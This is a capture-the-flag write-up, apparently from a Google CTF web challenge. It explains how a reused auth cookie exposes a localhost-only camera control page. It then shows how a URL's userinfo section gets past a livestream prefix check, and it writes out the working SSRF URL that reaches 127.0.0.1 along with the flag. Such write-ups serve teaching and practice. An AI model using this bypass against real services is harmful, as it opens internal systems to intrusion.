# Cookie World Order (Cookie)

## Description

Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very
clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon.
Funny they trust their security to a contractor outside their systems, especially one with such bad habits. Upon further
snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo.
Go forth and attain greater access to reach this creature!

## Solution

Adding the cookie with key `auth` and value `TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz` from the [previous challenge](../cookie_world_order/). Reveals
a new hidden admin link. Following that link reveals the **Camera Controls** menue option. [Accessing
it](https://cwo-xss.web.ctfcompetition.com/admin/controls) says `Requests only accepted from 127.0.0.1`. We have to
visit this site locally.

We are lucky because the livestream feature allows us to do a SSRF. Normally, it includes a livestream:

```
https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com/livestream/garden-livestream.webm
```

Changing the value of `livestream` prints an error message. The URL has to begin with `cwo-xss.web.ctfcompetition.com`.
The specification of a valid `URL` looks like this: 

```
scheme:[//authority]path[?query][#fragment]
authority = [userinfo@]host[:port]
```

Constructing a valid prefix can be done through the `userinfo` part. With this the prefix
`cwo-xss.web.ctfcompetition.com` will be present and the `host` part can be chosen by us:

```
https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@google.com
```

Requesting the **Camera Controls** over `127.0.0.1` can now be done like this:

```
https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@127.0.0.1/admin/controls
```

This prints the flag `CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}`.
